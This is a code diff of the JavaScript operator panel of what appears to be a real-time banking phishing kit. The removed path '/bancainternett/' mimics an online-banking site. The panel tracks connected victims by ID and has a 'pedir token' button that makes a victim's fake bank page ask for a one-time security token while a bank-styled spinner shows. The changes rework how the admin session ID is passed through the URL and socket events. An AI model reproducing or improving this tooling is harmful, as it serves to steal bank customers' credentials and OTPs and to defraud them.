@@ -1,11 +1,19 @@
 const socket = io.connect({
-        path: "/bancainternett/socket.io/"
+        path: "/socket.io/"
     })
 
+//Obtener identificador original
+const queryString = window.location.search;
+const urlParams = new URLSearchParams(queryString);
+//identificador listo
+const getAdm = urlParams.get('s');
 
 socket.on("connect", () => {
     console.log("El socket se ha conectado: ", socket.id);
-    socket.emit("AdmOn", socket.id);
+    if(getAdm == null){
+        window.location.href = "/adm/?s="+socket.id;
+    }
+    socket.emit("AdmOn", {'soketSesion': socket.id, 'Id': getAdm});
 })
 
 const panelData = document.querySelector("#panel-1");
@@ -93,8 +101,8 @@ const on = (element, event, selector, handler) => {
 on(document, 'click', '.pedir-token', e =>{
     const id = e.target.id;
     idUser = id.substring(2);
-    const admToken = socket.id;
-    socket.emit("PedirToken", {idUser, admToken});
+    //const admToken = socket.id;
+    socket.emit("PedirToken", {'idUser':idUser, 'idAdm': getAdm});
     document.querySelector("#"+id).innerHTML = "Volver a pedir token";
     document.querySelector("#"+id).style.display = "none";
     
@@ -105,7 +113,7 @@ on(document, 'click', '.pedir-token', e =>{
     const parentData = document.querySelector("#row-"+idUser);
     dataTokenInsert =   `<p class="token-load" id="token-load-${idUser}"> 
                             <b>Token:</b> 
-                            <img src="/bancainternett/img/Spinner-macro-Azul-Rota.gif">
+                            <img src="/img/Spinner-macro-Azul-Rota.gif">
                         </p>`;
     parentData.innerHTML += dataTokenInsert;
 })
